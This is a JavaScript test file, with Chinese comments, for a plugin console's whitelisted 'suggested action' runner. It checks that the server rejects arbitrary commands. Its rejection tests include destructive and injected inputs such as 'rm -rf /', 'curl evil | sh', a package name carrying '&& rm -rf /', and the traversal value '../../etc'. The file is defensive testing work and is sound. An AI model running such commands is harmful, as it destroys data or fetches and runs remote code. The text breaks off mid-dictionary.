// 「建议动作」执行框的专项验证（2026-09-27 加法；任务 C 的四条逐条钉死）
//
// C1 服务端：结构化动作接口（白名单动作类型、服务端自拼 argv）——**绝不接受客户端传来的命令字符串**
// C2 下发：安装结果里带 `suggestedAction = { kind, label, command, payload }`（老客户端忽略即向后兼容）
// C3 客户端：安装结果卡片旁的**小执行框**（短句 + 等宽只读命令 + 执行/复制 + 执行中 + 结果/错误 + 可关闭）
// C4 测试：结构契约（路由清单 + 字段）+ 离线渲染断言（有/无、执行中、成功、失败、中英切换）
//        + 服务端拒绝任意命令（`command:'rm -rf /'` 之类必须 400 且**一次都没执行**）
//
// 离线渲染的做法：client.js 只 require("react")、只 export 组件与若干纯函数 —— 于是可以喂一个
// **假 React**（真实极小的 hooks 运行时：useState 真能重渲染），把安装结果里的执行框真渲染成元素树，
// 再对树上的文本/按钮做断言。整条链路（点「执行」→ 发 POST /run-suggested → 回显结果）都跑在
// 假 fetch 上，**不发网络请求、不碰真实 profile**。
import { readFileSync, mkdirSync, writeFileSync, rmSync, existsSync, readdirSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { ACTION_KINDS, COMMAND_KEYS, IGNORED_BUILDS_REACHED_NOTE, parseActionRequest, runSuggestedAction, isReleaseAgeBlock } from '../lib/server/domain/plugin-actions.js'
import { preferredRegistries } from '../lib/server/domain/sources.js'

const ROOT = dirname(fileURLToPath(import.meta.url))
const HOME = join(ROOT, '.testdir', 'plugin-actions-home')
process.env.DSH_HOME = HOME
/** 真 pnpm 组用的隔离包名（夹具，不在 registry 上）。 */
const REAL_PKG = '@dsh-probe/pin-only-7c1f9a'

let failed = 0
const check = (label, cond, extra) => {
  console.log(`${cond ? 'PASS' : 'FAIL'} ${label}${extra === undefined ? '' : ' — ' + extra}`)
  if (!cond) failed += 1
}

rmSync(HOME, { recursive: true, force: true })
const PROFILE = join(HOME, 'profiles', 'web')
mkdirSync(join(PROFILE, 'node_modules', '@fake', 'demo'), { recursive: true })
writeFileSync(join(PROFILE, 'cordis.patch.yml'), '# actions test\n', 'utf8')
writeFileSync(join(PROFILE, 'node_modules', '@fake', 'demo', 'package.json'), JSON.stringify({ name: '@fake/demo', version: '1.0.0', main: 'index.js' }), 'utf8')
writeFileSync(join(PROFILE, 'node_modules', '@fake', 'demo', 'index.js'), 'export const ok = true\n', 'utf8')
const writeManifest = (deps) => writeFileSync(join(PROFILE, 'package.json'), `${JSON.stringify({ name: 'dsh-profile-actions', private: true, dependencies: deps }, null, 2)}\n`, 'utf8')
writeManifest({ '@fake/demo': '1.0.0' })
// 真机同形夹具：profile 一定带着 pnpm-workspace.yaml（pnpm 11 自己也往里写 allowBuilds / 排除项）。
// 一开始就写好，避免"先装依赖、后加 workspace 文件"造成 lock 设置不一致（frozen-lockfile 会报 mismatch）。
writeFileSync(join(PROFILE, 'pnpm-workspace.yaml'), 'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n', 'utf8')

console.log('=== C4-① 结构契约：路由清单 + 白名单动作 + payload 无命令位置 ===')
{
  // 路由清单（与 tests/test-route-inventory.mjs 的 58 条清单同一口径：源码里必须真的有这条 path）
  const walk = (dir) => readFileSync(dir, 'utf8')
  const routeSrc = walk(join(ROOT, '..', 'lib', 'server', 'routes', 'index.js'))
  check('路由 /plugin-console/run-suggested 已在路由表里注册（与路由清单测试同一口径）',
    routeSrc.includes('`${ROUTE_PREFIX}/run-suggested`'), 'routes/index.js')
  const actionSrc = readFileSync(join(ROOT, '..', 'lib', 'server', 'domain', 'plugin-actions.js'), 'utf8')
  check('白名单只有我们定义的动作类型（pin-dependency / reconcile-lock / allow-builds / overwrite-preset）',
    ACTION_KINDS.length === 4 && ['pin-dependency', 'reconcile-lock', 'allow-builds', 'overwrite-preset'].every((k) => ACTION_KINDS.includes(k)), JSON.stringify(ACTION_KINDS))
  check('服务端**自己**拼 argv（pnpmAddArgs / repairArgsFor），源码里没有拼客户端字符串的位置',
    actionSrc.includes('pnpmAddArgs(') && !/exec\(|spawn\(/u.test(actionSrc), 'plugin-actions.js')
  check('危险字段清单覆盖 command/cmd/argv/args/exec/shell/script/run/spawn/bin',
    ['command', 'cmd', 'argv', 'args', 'exec', 'shell', 'script', 'run', 'spawn', 'bin'].every((k) => COMMAND_KEYS.includes(k)), JSON.stringify(COMMAND_KEYS))
  const parsed = parseActionRequest({ action: 'pin-dependency', packageName: '@fake/demo', version: '1.0.0', profile: 'web' })
  // 0.5.26 加法：多了一个 presetName 字段（overwrite-preset 用）—— 断言改成**实质要求**
  // （"解析结果里没有任何命令字段"），而不是把键名清单写死：写死只会让每次加动作都要改这里，
  // 且完全挡不住真正该挡的东西。
  check('合法请求解析出的字段里**没有任何命令字段**（command/cmd/argv/args/exec/shell/script/run/spawn/bin）',
    parsed.ok === true && ['command', 'cmd', 'argv', 'args', 'exec', 'shell', 'script', 'run', 'spawn', 'bin'].every((k) => !(k in parsed))
    && Object.keys(parsed).sort().join(',') === 'action,error,ok,packageName,presetName,profile,status,version', JSON.stringify(parsed))
  check('★ overwrite-preset：presetName 只认**目录名**形状（空/路径分隔符/点目录/控制字符/超长 → 400）',
    parseActionRequest({ action: 'overwrite-preset', presetName: 'router-standard' }).ok === true
    && parseActionRequest({ action: 'overwrite-preset', presetName: '' }).status === 400
    && parseActionRequest({ action: 'overwrite-preset', presetName: '../../etc' }).status === 400
    && parseActionRequest({ action: 'overwrite-preset', presetName: 'a/b' }).status === 400
    && parseActionRequest({ action: 'overwrite-preset', presetName: '..' }).status === 400
    && parseActionRequest({ action: 'overwrite-preset', presetName: 'x\u0000y' }).status === 400
    && parseActionRequest({ action: 'overwrite-preset', presetName: 'y'.repeat(200) }).status === 400,
    JSON.stringify(parseActionRequest({ action: 'overwrite-preset', presetName: 'router-standard' })))
}

console.log('\n=== C4-② 服务端拒绝任意命令（400 且一次都不执行）===')
{
  for (const bad of [
    { action: 'pin-dependency', packageName: '@fake/demo', command: 'rm -rf /' },
    { action: 'pin-dependency', packageName: '@fake/demo', argv: ['rm', '-rf', '/'] },
    { action: 'pin-dependency', packageName: '@fake/demo', shell: 'curl evil | sh' },
    { action: 'run-anything', packageName: '@fake/demo' },
    { action: 'pin-dependency', packageName: '@fake/demo && rm -rf /' },
    { action: 'pin-dependency' },
  ]) {
    let ran = 0
    const result = await runSuggestedAction({
      body: bad, profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
      deps: { runAdd: async () => { ran += 1; return { stdout: '', stderr: '' } }, pin: async () => { ran += 1; throw new Error('不该被调用') }, repair: async () => { ran += 1; throw new Error('不该被调用') } },
    })
    const tag = JSON.stringify(bad).slice(0, 70)
    check(`拒绝并 400：${tag}`, result.ok === false && result.status === 400 && typeof result.error === 'string' && ran === 0, `status=${result.status} ran=${ran} err=${String(result.error).slice(0, 60)}`)
  }
  // 大小写 / 别名绕过也不行（字段名精确匹配，未登记的键一律不认）
  const sneaky = await runSuggestedAction({ body: { action: 'pin-dependency', packageName: '@fake/demo', Command: 'rm -rf /' }, profileDir: PROFILE, deps: { runAdd: async () => ({ stdout: '', stderr: '' }) } })
  check('未登记的字段不会被当成命令执行（只认白名单键；多余键不进 argv）',
    sneaky.action === 'pin-dependency' && !JSON.stringify(sneaky.command ?? '').includes('rm -rf'), JSON.stringify({ command: sneaky.command, ok: sneaky.ok }))
}

console.log('\n=== C1 执行器：pin-dependency 走产品路径（注入桩，不跑真 pnpm）===')
{
  // 桩 pin：真写清单（产品实现由 manifest.js 保证，这里只验动作编排）
  const pinned = []
  const runAddCalls = []
  const ok = await runSuggestedAction({
    body: { action: 'pin-dependency', packageName: '@fake/demo', version: '1.0.0', profile: 'web' },
    profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
    deps: {
      pin: async (profileDir, name) => {
        pinned.push(name)
        const spec = `link:${join(HOME, 'plugin-src', ...name.split('/')).replace(/\\/gu, '/')}`
        const manifest = JSON.parse(readFileSync(join(profileDir, 'package.json'), 'utf8'))
        manifest.dependencies[name] = spec
        writeManifest(manifest.dependencies)
        writeFileSync(join(profileDir, 'pnpm-lock.yaml'), `lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      '${name}':\n        specifier: ${spec}\n        version: link:../../plugin-src/${name}\n`, 'utf8')
        return { ok: true, spec, before: '1.0.0', after: spec, changed: true, dir: join(HOME, 'plugin-src', ...name.split('/')) }
      },
      runAdd: async (args) => { runAddCalls.push(args); return { stdout: 'Progress: resolved 1, reused 0, done\n', stderr: '' } },
    },
  })
  check('★ pin-dependency：清单与 lock 都指向 link: 时 ok=true、exitCode=0',
    ok.ok === true && ok.exitCode === 0 && ok.manifest.pinned === true && ok.lock.synced === true, JSON.stringify({ ok: ok.ok, exit: ok.exitCode, manifest: ok.manifest, lock: ok.lock }))
  check('★ 执行的是服务端自拼的 argv（pnpm add <link:…> --registry <主源>），且 command 仅供展示',
    runAddCalls.length === 1 && runAddCalls[0][0] === 'add' && String(runAddCalls[0][1]).startsWith('link:')
    && runAddCalls[0].includes('--registry') && String(ok.command).startsWith('pnpm add link:'), JSON.stringify(runAddCalls[0]))
  check('★ 动作只对本 profile 清单里的包生效（不在清单里的包 400，不执行）',
    (await runSuggestedAction({ body: { action: 'pin-dependency', packageName: 'left-pad' }, profileDir: PROFILE, deps: { pin: async () => { throw new Error('不该被调用') } } })).status === 400,
    'left-pad 未声明')

  // 失败路径：pnpm 报错 → ok=false，stdout/stderr 摘要与 exitCode 原样回显（不假装成功）。
  // 先把现场还原成"清单是版本号、lock 里没有这条"（否则上一步的 stub 已经把它对齐了，失败也无从体现）。
  writeManifest({ '@fake/demo': '1.0.0' })
  rmSync(join(PROFILE, 'pnpm-lock.yaml'), { force: true })
  const bad = await runSuggestedAction({
    body: { action: 'pin-dependency', packageName: '@fake/demo' },
    profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
    deps: {
      // 只写清单、不写 lock（模拟"pnpm 挂了/被占用，只完成了清单这一半"）
      pin: async (profileDir, name) => {
        const spec = `link:${join(HOME, 'plugin-src', ...name.split('/')).replace(/\\/gu, '/')}`
        const manifest = JSON.parse(readFileSync(join(profileDir, 'package.json'), 'utf8'))
        manifest.dependencies[name] = spec
        writeManifest(manifest.dependencies)
        return { ok: true, spec, before: '1.0.0', after: spec, changed: true, dir: join(HOME, 'plugin-src', ...name.split('/')) }
      },
      runAdd: async () => { const e = new Error('Command failed: pnpm add link:…'); e.code = 1; e.stdout = 'partial out\n'; e.stderr = 'ERR_PNPM_FETCH_404 boom\n'; throw e },
    },
  })
  check('★ pnpm 失败时如实回报（ok=false + exitCode + stderr 摘要），且清单已钉住这一半如实标成 partial',
    bad.ok === false && bad.partial === true && bad.exitCode === 1 && bad.stderr.includes('ERR_PNPM_FETCH_404')
    && bad.manifest.pinned === true && bad.lock.synced === false, JSON.stringify({ ok: bad.ok, partial: bad.partial, exit: bad.exitCode, lock: bad.lock, pinned: bad.manifest?.pinned }))
  check('★ 供应链闸判据只认 pnpm 自己的错误码/文案（认不出就绝不放宽）',
    isReleaseAgeBlock('ERR_PNPM_MINIMUM_RELEASE_AGE_VIOLATION: x') === true && isReleaseAgeBlock('boom') === false)

  // 未知选项降级（2026-09-27 CI 实测：CI 的 corepack 解析到 pnpm 12，`--fetch-timeout/--fetch-retries`
  // 在 pnpm 12 上是 `error: unexpected argument` 直接退出 —— 加固不允许变成"动作跑不成"）。
  // 桩：带加固选项就抛 pnpm 12 的文案，去掉后再跑必须成功。
  const seenArgv = []
  const resilient = await runSuggestedAction({
    body: { action: 'pin-dependency', packageName: '@fake/demo', version: '1.0.0' },
    profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
    deps: {
      runAdd: async (args) => {
        seenArgv.push(args.join(' '))
        if (args.some((a) => a.startsWith('--fetch-timeout') || a.startsWith('--fetch-retries'))) {
          const e = new Error("error: unexpected argument '--fetch-timeout' found\n\nUsage: pnpm add --registry <REGISTRY> <PACKAGE_NAMES>...")
          e.code = 2
          e.stderr = "error: unexpected argument '--fetch-timeout' found"
          throw e
        }
        // 真 pnpm 成功后会把 link 条目写进 lock（这一段要验的是"降级后动作成功"，所以桩也要写）
        writeFileSync(join(PROFILE, 'pnpm-lock.yaml'), `lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      '@fake/demo':\n        specifier: ${String(args[1])}\n        version: link:../../plugin-src/@fake/demo\n`, 'utf8')
        return { stdout: 'Done in 300ms using pnpm v12.6.0\n', stderr: '' }
      },
    },
  })
  check('★ pnpm 12 文案（unexpected argument）触发未知选项降级：去掉加固选项重试后动作成功',
    resilient.ok === true && resilient.exitCode === 0 && seenArgv.length === 2
    && /--fetch-timeout/u.test(seenArgv[0]) && !/--fetch-timeout/u.test(seenArgv[1]), JSON.stringify(seenArgv))

  // reconcile-lock：复用 lockfile-health 的 repair（唯一 argv 产出点）
  const repairView = { ok: true, action: 'repaired', command: 'install --lockfile-only --no-frozen-lockfile --registry https://registry.npmmirror.com', reason: '只重写了 pnpm-lock.yaml；package.json 与 node_modules 未改动。', hint: 'lock 已按清单重建', stderrTail: null, packages: [] }
  const recon = await runSuggestedAction({ body: { action: 'reconcile-lock', profile: 'web' }, profileDir: PROFILE, registries: ['https://registry.npmmirror.com'], deps: { repair: async () => repairView } })
  check('★ reconcile-lock：复用 lockfile-health 的 repair（argv 不带任何绕过供应链闸的开关）',
    recon.ok === true && recon.command === repairView.command && !/minimumReleaseAge/u.test(recon.command), JSON.stringify({ ok: recon.ok, command: recon.command }))
  check('主源优先的 registry 列表非空（探测/执行共用一份口径）', preferredRegistries().length > 0, JSON.stringify(preferredRegistries()))
}

console.log('\n=== A-③ 失败分类：ERR_PNPM_IGNORED_BUILDS + 清单/lock 已就位 → ok=true（exitCode 如实）===')
{
  // 与真机同形的桩：pnpm 退出码 1、stderr 是 pnpm 11.7.0 的原话；pin 桩把清单与 lock 都写成 link:。
  const pinAndLock = async (profileDir, name) => {
    const spec = `link:${join(HOME, 'plugin-src', ...name.split('/')).replace(/\\/gu, '/')}`
    const manifest = JSON.parse(readFileSync(join(profileDir, 'package.json'), 'utf8'))
    manifest.dependencies[name] = spec
    writeManifest(manifest.dependencies)
    writeFileSync(join(profileDir, 'pnpm-lock.yaml'), `lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      '${name}':\n        specifier: ${spec}\n        version: link:../../plugin-src/${name}\n`, 'utf8')
    return { ok: true, spec, before: '1.0.0', after: spec, changed: true, dir: join(HOME, 'plugin-src', ...name.split('/')) }
  }
  const ignoredStderr = 'Command failed: pnpm add link:…\n[ERR_PNPM_IGNORED_BUILDS] Ignored build scripts: cloudflared@0.7.3, cpu-features@0.0.10, ssh2@1.17.0\n\nRun "pnpm approve-builds" to pick which dependencies should be allowed to run scripts.'
  const ignoredError = () => { const e = new Error('Command failed: pnpm add link:…'); e.code = 1; e.stderr = ignoredStderr; e.stdout = 'Packages: -10\n'; return e }
  const reached = await runSuggestedAction({
    body: { action: 'pin-dependency', packageName: '@fake/demo', version: '1.0.0' },
    profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
    deps: { pin: pinAndLock, runAdd: async () => { throw ignoredError() } },
  })
  check('★ 目标状态已达成 + 构建脚本未获批准 → ok=true（不再报成失败）',
    reached.ok === true && reached.partial === false && reached.kind === 'ignored-builds'
    && reached.manifest.pinned === true && reached.lock.synced === true,
    JSON.stringify({ ok: reached.ok, kind: reached.kind, manifest: reached.manifest?.pinned, lock: reached.lock?.synced }))
  check('★ exitCode 如实回报（1 就是 1，绝不抹成 0）', reached.exitCode === 1, String(reached.exitCode))
  check('★ note 就是约定的那句话（逐字）',
    Array.isArray(reached.notes) && reached.notes[0] === IGNORED_BUILDS_REACHED_NOTE
    && reached.notes[0].includes('如需放行请点「允许这些构建脚本」'),
    JSON.stringify(reached.notes.slice(0, 1)))
  check('★ 报错里点名的三个包原样带回（面板/按钮直接用）',
    JSON.stringify(reached.ignoredBuilds) === JSON.stringify(['cloudflared', 'cpu-features', 'ssh2']), JSON.stringify(reached.ignoredBuilds))
  check('★ 同一个结果里带上第二个动作 nextAction=allow-builds（结构化，无命令位置）',
    reached.nextAction?.kind === 'allow-builds' && reached.nextAction?.payload?.action === 'allow-builds'
    && typeof reached.nextAction?.command === 'string' && reached.nextAction?.payload?.packageName === undefined,
    JSON.stringify(reached.nextAction))
  check('★ stderr 原样回显（用户能自己核对 pnpm 说了什么）', String(reached.stderr).includes('ERR_PNPM_IGNORED_BUILDS'))

  // 反例：清单/lock **没**到位时，同一类报错必须仍如实报失败（ok=false + partial 语义不变）
  writeManifest({ '@fake/demo': '1.0.0' })
  rmSync(join(PROFILE, 'pnpm-lock.yaml'), { force: true })
  const notReached = await runSuggestedAction({
    body: { action: 'pin-dependency', packageName: '@fake/demo' },
    profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
    deps: {
      pin: async (profileDir, name) => {
        const spec = `link:${join(HOME, 'plugin-src', ...name.split('/')).replace(/\\/gu, '/')}`
        const manifest = JSON.parse(readFileSync(join(profileDir, 'package.json'), 'utf8'))
        manifest.dependencies[name] = spec
        writeManifest(manifest.dependencies)
        return { ok: true, spec, before: '1.0.0', after: spec, changed: true, dir: join(HOME, 'plugin-src', ...name.split('/')) }
      },
      runAdd: async () => { throw ignoredError() },
    },
  })
  check('★ 反例：清单/lock 未就位时仍如实报失败（ok=false、partial=true、exitCode=1）',
    notReached.ok === false && notReached.partial === true && notReached.exitCode === 1
    && notReached.notes.some((n) => n.includes('还没到目标状态')), JSON.stringify({ ok: notReached.ok, partial: notReached.partial, notes: notReached.notes }))
}

console.log('\n=== C1 真机路径（真 pnpm、不出外网）：动作的 pnpm 那一步真的跑起来 ===')
// 为什么单开一段：上面那段把 runAdd 换成了桩（为了钉住"失败也要如实回报"），但**动作真的会执行 pnpm**
// 这件事必须由真 pnpm 证一次 —— 用隔离 profile + 一个只在本地存在的包（link: 不经 registry），
// 断言：exitCode=0、清单/lock 都是 link:、且 node_modules/<包名> 真的被 pnpm 换成了指向 plugin-src 的链接。
{
  const realDir = join(PROFILE, 'node_modules', ...REAL_PKG.split('/'))
  mkdirSync(realDir, { recursive: true })
  writeFileSync(join(realDir, 'package.json'), JSON.stringify({ name: REAL_PKG, version: '0.0.1-rc9', main: 'index.js' }), 'utf8')
  writeFileSync(join(realDir, 'index.js'), 'export const ok = true\n', 'utf8')
  writeManifest({ ...JSON.parse(readFileSync(join(PROFILE, 'package.json'), 'utf8')).dependencies, [REAL_PKG]: '0.0.1-rc9' })
  rmSync(join(PROFILE, 'pnpm-lock.yaml'), { force: true })
  let pnpmUsable = true
  let pnpmError = null
  try {
    const { runPnpmWithFallback } = await import('../lib/server/infra/exec.js')
    await runPnpmWithFallback(['--version'], { execOpts: { cwd: PROFILE, timeout: 60000, windowsHide: true } })
  } catch (error) {
    pnpmUsable = false
    pnpmError = String(error?.message ?? error).slice(0, 300)
  }
  if (!pnpmUsable) {
    console.log(`SKIP 真 pnpm 组（动作的 pnpm 那一步） —— 真 pnpm 通道不可用：${pnpmError}`)
  } else {
    const real = await runSuggestedAction({
      body: { action: 'pin-dependency', packageName: REAL_PKG, version: '0.0.1-rc9', profile: 'web' },
      profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
    })
    const spec = JSON.parse(readFileSync(join(PROFILE, 'package.json'), 'utf8')).dependencies[REAL_PKG]
    // 防御式读取：pnpm 没写成 lock 时，要报"动作失败 + 原始输出"，而不是让用例自己崩掉（首版 CI 就是这么红的）
    const lockText = existsSync(join(PROFILE, 'pnpm-lock.yaml')) ? readFileSync(join(PROFILE, 'pnpm-lock.yaml'), 'utf8') : ''
    check('★ 真 pnpm：动作执行成功（ok=true、exitCode=0、清单是 link:、lock 有条目、命令原样回显）',
      real.ok === true && real.exitCode === 0 && real.manifest.pinned === true && real.lock.synced === true
      && real.relaxedReleaseAge === false && String(real.command).startsWith('pnpm add link:')
      && String(spec).startsWith('link:') && lockText.includes(`'${REAL_PKG}':`),
      JSON.stringify({ ok: real.ok, exit: real.exitCode, spec, lock: real.lock, stderr: String(real.stderr).slice(-200) }))
    let linkType = null
    try {
      const { lstatSync } = await import('node:fs')
      linkType = lstatSync(realDir).isSymbolicLink() ? 'symlink' : 'dir'
    } catch { linkType = 'missing' }
    check('★ 真 pnpm：node_modules/<包名> 被真的换成了指向 plugin-src 的链接（不是只写了两个文本文件）',
      linkType === 'symlink', `linkType=${linkType}`)
  }

  // ── A-③ 的**真 pnpm** 证据（2026-09-27 加法）：让 pnpm 自己产出 ERR_PNPM_IGNORED_BUILDS，
  //    再断言"目标状态已达成 → ok=true、exitCode 如实、note 就是那句话、nextAction 是 allow-builds"。
  //    做法：用 pnpm pack 打一个带 install 脚本的本地小包当依赖（离线、秒级；脚本只写一个标记文件）。
  //    已知边界（真机 + 本用例都实测到，写在这里免得后人误判）：pnpm 11 对 `file:` 形态的依赖**匹配不上**
  //    `allowBuilds: <name>: true`（dep path 不是 name@semver），所以这里只验到"分类 + 显式放行写盘"；
  //    "放行后 pnpm 真的构建、exitCode=0" 由真机（registry 依赖，名字能匹配）在 E-③ 里验证。
  const probeRoot = join(PROFILE, 'build-probe-src')
  const basePath = join(PROFILE, 'node_modules', ...REAL_PKG.split('/'))
  if (!existsSync(basePath)) {
    console.log('SKIP 真 pnpm · ignored-builds 组 —— 上一个真 pnpm 组没把夹具装好')
  } else {
    const { runPnpmWithFallback, buildPnpmEnv } = await import('../lib/server/infra/exec.js')
    const execOpts = { cwd: probeRoot, timeout: 120000, windowsHide: true, maxBuffer: 8 * 1024 * 1024 }
    mkdirSync(probeRoot, { recursive: true })
    writeFileSync(join(probeRoot, 'package.json'), JSON.stringify({
      name: 'build-probe', version: '1.0.0', files: ['index.js'],
      scripts: { install: "node -e \"require('fs').writeFileSync(require('path').join(__dirname,'MARKER.txt'),'ran')\"" },
    }, null, 2), 'utf8')
    writeFileSync(join(probeRoot, 'index.js'), 'module.exports = 1\n', 'utf8')
    let packed = null
    try {
      // runPnpmWithFallback 只回报用到的 runner（stdout 由 exec 自己吞掉）→ 打完包从目录里认 tgz
      await runPnpmWithFallback(['pack'], { execOpts: { ...execOpts, env: buildPnpmEnv('https://registry.npmmirror.com') } })
      packed = readdirSync(probeRoot).find((f) => f.endsWith('.tgz')) ?? null
    } catch (error) {
      console.log(`SKIP 真 pnpm · ignored-builds 组 —— pnpm pack 不可用：${String(error?.message ?? error).slice(0, 200)}`)
    }
    if (packed === null) console.log('SKIP 真 pnpm · ignored-builds 组 —— pnpm pack 没产出 tgz（见上一行原始输出）')
    if (packed !== null && existsSync(join(probeRoot, packed))) {
      const tgzSpec = `file:${join(probeRoot, packed).replace(/\\/gu, '/')}`
      // 保持上一步真 pnpm 写好的 link: 形态（这样这一步不需要 registry），只**加**一个带安装脚本的依赖
      const depsNow = JSON.parse(readFileSync(join(PROFILE, 'package.json'), 'utf8')).dependencies
      if (String(depsNow[REAL_PKG] ?? '').startsWith('link:') !== true) {
        console.log('SKIP 真 pnpm · ignored-builds 组 —— 夹具里的 pin 目标不是 link: 形态')
      } else {
      writeManifest({ ...depsNow, 'build-probe': tgzSpec })
      let setupErr = null
      try {
        // --no-frozen-lockfile：这一步是**造夹具**（新增一个 file: 依赖），不是产品行为；
        // CI 上 pnpm 默认 frozen → 不加这个开关会先报 OUTDATED_LOCKFILE，掩盖我们要的 ignored-builds
        await runPnpmWithFallback(['install', '--no-frozen-lockfile'], { execOpts: { cwd: PROFILE, timeout: 180000, windowsHide: true, maxBuffer: 8 * 1024 * 1024, env: buildPnpmEnv('https://registry.npmmirror.com') } })
      } catch (error) { setupErr = error }
      const setupText = `${setupErr?.stderr ?? ''}${setupErr?.message ?? ''}`
      if (!/ERR_PNPM_IGNORED_BUILDS/u.test(setupText)) {
        console.log(`SKIP 真 pnpm · ignored-builds 组 —— 夹具没造出预期的报错：${setupText.slice(-200) || '（没有报错）'}`)
      } else {
        const realIgnored = await runSuggestedAction({
          body: { action: 'pin-dependency', packageName: REAL_PKG, version: '0.0.1-rc9', profile: 'web' },
          profileDir: PROFILE, registries: ['https://registry.npmmirror.com'],
        })
        check('★ 真 pnpm：构建脚本未获批准 + 目标状态已达成 → ok=true、kind=ignored-builds、exitCode 如实（非 0）',
          realIgnored.ok === true && realIgnored.kind === 'ignored-builds' && realIgnored.exitCode !== 0
          && realIgnored.manifest.pinned === true && realIgnored.lock.synced === true,
          JSON.stringify({ ok: realIgnored.ok, kind: realIgnored.kind, exit: realIgnored.exitCode, lock: realIgnored.lock }))
        check('★ 真 pnpm：note 就是约定的那句话，并点名了被忽略的依赖',
          realIgnored.notes?.[0] === IGNORED_BUILDS_REACHED_NOTE && realIgnored.ignoredBuilds.includes('build-probe'),
          JSON.stringify({ note: realIgnored.notes?.[0]?.slice(0, 40), ignored: realIgnored.ignoredBuilds }))
        check('★ 真 pnpm：stderr 原样带回 pnpm 的原话（面板可核对）',
          String(realIgnored.stderr).includes('ERR_PNPM_IGNORED_BUILDS'), String(realIgnored.stderr).slice(-120))
        const wsFile = join(PROFILE, 'pnpm-workspace.yaml')
        const beforeWs = readFileSync(wsFile, 'utf8')
        const allowed = await runSuggestedAction({ body: { action: 'allow-builds' }, profileDir: PROFILE, registries: [] })
        const afterWs = readFileSync(wsFile, 'utf8')
        check('★ 真 pnpm 现场：显式放行把 build-probe 写进 allowBuilds（顶层回报 changed/added/file/sha256/backup）',
          allowed.ok === true && allowed.changed === true && allowed.added.includes('build-probe')
          && allowed.file === wsFile && allowed.sha256Before !== allowed.sha256After
          && typeof allowed.backup === 'string' && existsSync(allowed.backup), JSON.stringify({ ok: allowed.ok, added: allowed.added, backup: allowed.backup }))
        check('★ 真 pnpm 现场：除新增的 allowBuilds 块外，原文件每一行都还在（其它字段未动）',
          beforeWs.split('\n').every((line) => line === '' || afterWs.includes(line)) && afterWs.includes('allowBuilds:'),
          JSON.stringify(afterWs.split('\n').slice(-4)))
      }
      }
    }
  }
}

console.log('\n=== C3/C4-③ 离线渲染：用假 React 真渲染安装结果里的执行框 ===')
{
  // ── 假 React：真实极小的 hooks 运行时（useState 真能重渲染），其余 API 只做形状兼容 ──
  const makeReact = () => {
    let hooks = []
    let cursor = 0
    let current = null
    let rerender = null
    const react = {
      createElement: (type, props, ...children) => ({ type, props: { ...(props ?? {}), children: children.length <= 1 ? children[0] : children } }),
      useState: (initial) => {
        const index = cursor
        cursor += 1
        if (hooks[index] === undefined) hooks[index] = initial
        const set = (next) => { hooks[index] = typeof next === 'function' ? next(hooks[index]) : next; if (rerender !== null) rerender() }
        return [hooks[index], set]
      },
      useRef: (initial) => { const index = cursor; cursor += 1; if (hooks[index] === undefined) hooks[index] = { current: initial }; return hooks[index] },
      useEffect: () => {}, useMemo: (fn) => fn(), useCallback: (fn) => fn, useReducer: (r, i) => [i, () => {}],
    }
    react.__setCurrent = (fn) => { current = fn }
    react.__reset = () => { hooks = []; cursor = 0 }
    react.__render = () => { cursor = 0; return current() }
    react.__setRerender = (fn) => { rerender = fn }
    return react
  }
  const react = makeReact()
  let exports = null
  globalThis.window = {
    __ModuleLoader__: {
      load: ({ factory }) => { exports = factory((name) => { if (name === 'react') return react; throw new Error(`unexpected require: ${name}`) }) },
    },
    setTimeout: () => 0, clearInterval: () => {}, setInterval: () => 0, location: { reload: () => {} },
  }
  globalThis.document = { querySelector: () => null, createElement: () => ({ dataset: {}, style: {}, appendChild: () => {} }), head: { appendChild: () => {} } }
  await import(pathToFileURL(join(ROOT, '..', 'lib', 'client.js')).href)
  check('client.js 可离线加载（只 require("react")）并导出执行框组件（供渲染断言）',
    exports !== null && typeof exports.SuggestedActionBox === 'function' && typeof exports.apply === 'function')

  // ── 极简渲染：把元素树折成可断言的文本/按钮清单 ──
  const flatten = (node, out = { texts: [], buttons: [], nodes: [], codes: [] }) => {
    if (node === null || node === undefined || node === false) return out
    if (Array.isArray(node)) { for (const n of node) flatten(n, out); return out }
    if (typeof node === 'string' || typeof node === 'number') { out.texts.push(String(node)); return out }
    if (typeof node.type === 'function') { return flatten(node.type(node.props), out) }
    out.nodes.push({ tag: node.type, className: node.props?.className ?? null, disabled: node.props?.disabled === true, onClick: node.props?.onClick ?? null, title: node.props?.title ?? null, props: node.props ?? {} })
    if (node.type === 'button') out.buttons.push(node.props?.children)
    if (node.type === 'code') out.codes.push(node.props?.children)
    flatten(node.props?.children, out)
    return out
  }
  // 真渲染一个"作业"（job 就是 /install-status 下发的对象）→ 折成文本/按钮。
  // 关键：把组件函数**当组件调用**（经过假 React 的 hooks 运行时），而不是只造一个元素对象 ——
  // 否则 useState 的更新不会触发任何重渲染，"执行中/成功/失败"三种状态就断言不出来。
  const renderJob = (job, t) => {
    react.__reset()
    const tree = []
    react.__setRerender(() => { tree.length = 0; tree.push(react.__render()) })
    react.__setCurrent(() => exports.SuggestedActionBox({ job, t }))
    tree.push(react.__render())
    return { tree, calls: () => { tree.length = 0; tree.push(react.__render()) }, view: () => flatten(tree[0]) }
  }
  const buttonByText = (flat, text) => flat.nodes.find((n) => n.tag === 'button' && n.props?.children === text)
  const zh = (key, vars) => {
    const dict = {
      actionBoxTitle: '建议动作', actionPinLabel: '钉住该依赖（按 link: 记录）', actionReconcileLabel: '重建 pnpm-lock.yaml',
      actionRun: '执行', actionCopy: '复制', actionCopied: '已复制命令', actionRunning: '执行中…',
      actionOk: '执行成功', actionPartial: '部分成功（清单已改，lock 未对齐）', actionFailed: '执行失败',
      actionLongTitle: '控制台按白名单动作执行', closeModal: '关闭',
